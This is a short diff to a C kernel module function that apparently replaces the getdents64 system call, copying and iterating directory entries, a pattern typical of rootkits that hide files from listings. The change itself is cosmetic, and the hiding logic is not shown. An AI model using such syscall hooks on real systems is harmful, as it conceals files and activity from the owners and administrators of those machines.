@@ -38,13 +38,13 @@ int new_getdents64(const struct pt_regs *regs) {
     if (total_bytes_read > 0) {
         first = kmalloc(total_bytes_read, GFP_KERNEL);
 
-        int copy_res = copy_from_user((void *)first, buff_pointer, (unsigned long)total_bytes_read);
+        int copy_res = copy_from_user(first, buff_pointer, (unsigned long)total_bytes_read);
         if (copy_res) {
             printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
             return total_bytes_read;
         }
 
-        struct linux_dirent64 * curr = first;
+        struct linux_dirent64 *curr = first;
 
         int i = 0;
         while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
